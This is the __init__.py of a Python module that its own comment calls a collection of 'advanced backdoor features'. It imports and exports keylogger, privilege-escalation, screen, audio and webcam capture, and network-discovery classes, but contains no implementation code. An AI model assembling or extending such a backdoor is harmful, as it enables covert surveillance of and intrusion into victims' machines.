# Features Module
# Contains all advanced backdoor features

from .keylogger import Keylogger, FallbackKeylogger, PYNPUT_AVAILABLE
from .privilege_escalation import PrivilegeEscalation
from .screen_audio_capture import ScreenCapture, AudioCapture, WebcamCapture
from .network_discovery import NetworkDiscovery

__all__ = [
    'Keylogger',
    'FallbackKeylogger',
    'PYNPUT_AVAILABLE',
    'PrivilegeEscalation',
    'ScreenCapture',
    'AudioCapture',
    'WebcamCapture',
    'NetworkDiscovery',
]
